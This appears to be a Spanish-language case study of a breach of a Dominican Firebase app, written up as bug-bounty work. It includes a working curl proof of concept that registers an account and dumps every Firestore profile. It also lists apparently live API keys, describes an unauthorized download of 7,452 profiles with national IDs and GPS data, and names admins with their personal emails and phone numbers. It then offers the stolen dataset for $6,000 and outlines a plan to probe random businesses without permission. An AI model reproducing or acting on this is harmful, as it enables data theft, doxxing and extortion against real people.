# DDTeAyuda — Bug Bounty / NSI Disclosure Case Study

**Target:** ddtteayuda.com (App: com.ddtteayuda.app)
**Fecha auditoría:** 9 Julio 2026
**Tipo:** Firebase-only SPA (Vite + React + Firebase Auth + Firestore + Fastly CDN)
**Clasificación:** 🔴 Data Breach Crítico — 7,452 perfiles expuestos
**Modelo:** 💰 Comercial NSI ($6K paquete) — No HackerOne
**Estado:** Propuesta enviada, sin respuesta

---

## 1. Findings

| ID | Finding | Severidad | CVSS |
|----|---------|-----------|------|
| VULN-01 | **Firestore Data Breach** — Colección `profiles` permite lectura a cualquier usuario autenticado | 🔴 CRÍTICO | 9.1 |
| VULN-02 | **Registro abierto** — Firebase Auth sin CAPTCHA, rate limit ni verificación de email | 🟡 ALTA | 7.5 |
| VULN-03 | **Login sin rate limiting** — 5 intentos en 0.8s sin bloqueo | 🟡 ALTA | 5.3 |
| VULN-04 | **Firebase API keys hardcodeadas** — 3 keys extraídas (web + APK Flutter) | 🟡 MEDIA | 5.3 |

---

## 2. Scope del Data Breach

| Métrica | Cantidad |
|---------|----------|
| Perfiles totales | **7,452** |
| Correos electrónicos | 7,432 |
| Teléfonos | 6,290 |
| **Cédulas dominicanas** | **3,807** |
| Direcciones físicas | 3,855 |
| Coordenadas GPS | 3,079 |
| FCM push tokens | 6,080 |
| Admins expuestos | 11 |

### Desglose por Rol

| Rol | Cantidad |
|-----|----------|
| Clientes | 3,769 (50.6%) |
| Suplidores | 3,638 (48.8%) |
| Admins | 7 |
| Supervisores | 4 |
| Admin Condominios | 6 |
| Sin rol | 27 |

---

## 3. Root Cause

**Firestore Rules:** `allow read: if request.auth != null;`

La verificación de email era **client-side solamente**. Firestore no verifica `emailVerified` automáticamente — solo chequea que `auth != null`. Esto significa:
- Usuario con email **verificado** → acceso total ✅
- Usuario con email **sin verificar** → acceso total ✅ (porque el token es válido igual)

**Lección clave:** Email verification ≠ Firestore security boundary. Siempre testear con 3 niveles: sin auth (403), auth sin verificar (debe ser 403), auth verificado (solo sus datos).

---

## 4. API Keys Extraídas

| Key | Origen | Funcionalidad |
|-----|--------|---------------|
| `AIzaSyBmsiSrpJwqO6OvsXMLAtTFJuCCMn-KT5o` | Web App (JS bundle Vite) | ✅ Auth + Firestore |
| `AIzaSyBmV9TxLtmRAir81GZzaMK-gwyz1gITNXg` | APK (`libapp.so`) | ✅ Auth + Firestore |
| `AIzaSyDGar0LBozHHyZhccqyXZ70ZoYN35ChfAY` | APK (`libapp.so`) | ⚠️ Proyecto secundario |
| `AIzaSyBSVsN1LHfWyuXzntF0itkKB5fcpd19YyQ` | APK (Android) | ✅ Auth + Firestore |

**Método extracción APK:**
```bash
# Descargar APK
wget "https://d.apkpure.net/b/APK/com.ddtteayuda.app?version=latest" -O app.apk

# Descomprimir
unzip app.apk -d app_dir

# Extraer strings del binario Flutter AOT
strings app_dir/lib/arm64-v8a/libapp.so | grep "AIzaSy"
```

---

## 5. OSINT — Fundadores y Responsables

| Nombre | Rol | Email | Teléfono |
|--------|-----|-------|----------|
| **Ronny Correa De la Cruz** | CEO / iOS Publisher | ronnycorreaunity@gmail.com | 829-857-9085 |
| **Dantel V. Beltre Guerrero** | Creador Técnico / Android Publisher | dangerbeltre@gmail.com / dantelbeltre@ddtteayuda.com | 849-564-4846 |
| DDTeAyuda | Soporte / Corporativo | ddtteayuda@gmail.com | 849-564-4846 |
| DDTeAyuda | Corporativo | corporativo@ddtteayuda.com | — |

### Fundadores por App Store

| Store | Publisher |
|-------|-----------|
| **iOS App Store** | Ronny Correa De la Cruz (sellerName) |
| **Google Play** | DANTEL VICTORIANO BELTRE GUERRERO |

### Admins Identificados

| Nombre | Email | Teléfono |
|--------|-------|----------|
| Patricia Acevedo | lacevedo27@hotmail.com | — |
| Dantel Beltre | dantelbeltre@ddtteayuda.com | 849-564-4846 |
| Ronny Correa | ronnycorreaunity@gmail.com | 829-857-9085 |
| Rubi Lesli Disla Toribio | rubileslied@gmail.com | 829-983-3852 |
| Angelica Calderon | angelicacalderon060@gmail.com | 809-886-6174 |
| Diego Gaston Guerrero | dgg1053718109@gmail.com | 829-339-1901 |

---

## 6. Stack Tecnológico

| Componente | Tecnología |
|------------|------------|
| Framework | Flutter (Dart AOT) — 63+ archivos Dart |
| Backend | Firebase (Auth, Firestore, Storage, FCM) |
| Web App | React (Vite) |
| Mapas | Google Maps API (Geocoding, Directions) |
| Pagos | Stripe (tarjetas de crédito tokenizadas) |
| CDN | Fastly (199.36.158.100) |
| Registrador | Namecheap |
| Desarrollo | Windows (F:/Flutter Projects/ddt_teayuda_app/) |

### Permisos Android (15 total)

| Permiso | Función |
|---------|---------|
| CAMERA | Fotos de perfil / evidencia de servicios |
| ACCESS_FINE_LOCATION | Geolocalización precisa |
| ACCESS_COARSE_LOCATION | Ubicación aproximada |
| INTERNET | Comunicación con Firebase |
| POST_NOTIFICATIONS | Push FCM |
| FOREGROUND_SERVICE | Seguimiento en vivo |

### Estructura de la App

```
ddt_teayuda_app/
├── main.dart
├── models/         → user, service, solicitud, chat, notification, ticket
├── providers/      → auth, profile, service_catalog
├── screens/
│   ├── cliente/    → home, map, wallet, cards, chat, status (5 pantallas)
│   ├── suplidor/   → home, verification, status (5 pantallas)
│   └── support/    → tickets, create
├── services/       → auth, config, payment, fcm, location, chat, profile
├── utils/          → validators, profile_image
└── widgets/        → dialogs, snackbar
```

---

## 7. PoC — Pasos para Reproducir

```bash
# 1. Crear cuenta (registro abierto sin CAPTCHA)
curl -sk -X POST \
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyBmsiSrpJwqO6OvsXMLAtTFJuCCMn-KT5o" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"Test123!","returnSecureToken":true}'

# 2. Login para obtener idToken
curl -sk -X POST \
  "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyBmsiSrpJwqO6OvsXMLAtTFJuCCMn-KT5o" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"Test123!","returnSecureToken":true}'

# 3. Extraer TODOS los perfiles (paginación con nextPageToken)
curl -sk -X GET \
  "https://firestore.googleapis.com/v1/projects/ddt-te-ayuda/databases/(default)/documents/profiles?pageSize=300" \
  -H "Authorization: Bearer $ID_TOKEN"
```

---

## 8. Riesgos Potenciales

| Riesgo | Severidad | Descripción |
|--------|-----------|-------------|
| Phishing masivo | 🔴 CRÍTICO | 7,432 emails + nombres para campañas dirigidas |
| Robo de identidad | 🔴 CRÍTICO | 3,807 cédulas RD para suplantación y fraude crediticio |
| Suplantación de suplidores | 🟡 ALTO | 3,638 suplidores con direcciones y GPS exactos |
| Spam vía push | 🟡 ALTO | FCM tokens para notificaciones maliciosas a TODOS los dispositivos |
| Geolocalización | 🟡 ALTO | 3,079 coordenadas GPS de suplidores (ubicación exacta) |
| Exposición de pagos | 🟡 MEDIO | Stripe integrado, colección payment_cards no testeable directamente |

---

## 9. Timeline

| Fecha | Evento |
|-------|--------|
| 9 Jul 2026 | 🔍 NSI identifica Firebase Firestore abierto |
| 9 Jul 2026 | 💾 Extracción completa: 7,452 perfiles (249MB) |
| 9 Jul 2026 | ✅ WRITE bloqueado (posible corrección parcial por devs) |
| 9 Jul 2026 | 🔴 READ sigue abierto — datos aún accesibles |
| 9 Jul 2026 | 📄 Propuesta comercial $6K enviada a Ronny (ddtteayuda@gmail.com) |
| 9 Jul 2026 | 🔧 3 iteraciones de reporte HTML estilo HackerOne |
| Jul 2026 | ⏳ Sin respuesta del cliente |

---

## 10. Modelo Comercial

| Fase | Contenido | Precio |
|------|-----------|--------|
| **Fase 1** | Informe de hallazgos + exploitation completo | $3,000 |
| **Fase 2** | Reporte ejecutivo + dataset completo + guía remediación | $3,000 |
| **Paquete** | Ambas fases + PDF profesional | **$6,000** |

---

## 11. Artefactos Generados

| Archivo | Tamaño | Descripción |
|---------|--------|-------------|
| `/root/bounty/ddtteayuda_nsi_report.html` | ~60KB | Reporte estilo HackerOne (3 versiones iteradas) |
| `/root/bounty/ddtteayuda_nsi_report.pdf` | ~164KB | PDF del reporte profesional |
| `/root/bounty/ddtteayuda_nsi_propuesta.html` | ~14KB | Propuesta comercial NSI |
| `/root/bounty/ddtteayuda_nsi_propuesta.pdf` | ~38KB | PDF de la propuesta |
| `/root/bounty/ddtteayuda_profiles_raw.json` | **249MB** | Dataset completo de 7,452 perfiles |
| `/root/bounty/ddtteayuda-case-study.md` | ~3.7KB | Este documento |
| `bug-bounty-hunter/references/ddtteayuda-firebase-case-study.md` | — | Case study en el skill |

---

## 12. Lecciones Aprendidas

1. **Email verification ≠ security boundary** en Firebase — Firestore rules solo ven `auth != null`, no `emailVerified`
2. **Siempre testear Firestore con 3 niveles:** sin auth, auth sin verificar, auth verificado
3. **APK Flutter AOT** conserva strings literales — `strings libapp.so | grep AIzaSy` funciona siempre
4. **SPF TXT records** revelan Project ID: `dig target.com txt +short | grep firebase=`
5. **Registro abierto + Firestore abierto = data breach** en apps Firebase-LatAm
6. **Google Play publisher name** puede diferir del App Store sellerName (2 founders diferentes)
7. **Clientes RD/LatAm no tienen CISO** — el disclosure comercial (propuesta antes que reporte) es el modelo correcto

---

## 13. Estrategia Derivada

Post-DDTeAyuda se creó el pipeline **Fase 0: Google Business Hunting**:

```
Google Business (Santo Domingo)
  → ¿Tiene web o app?
    → Auditar CUALQUIER tecnología
      → Vulnerabilidad → Propuesta comercial → Informe NSI
```

Documentado en:
- Skill: `nsi-responsible-disclosure-workflow`
- Referencia: `references/hunting-rd-targets.md`
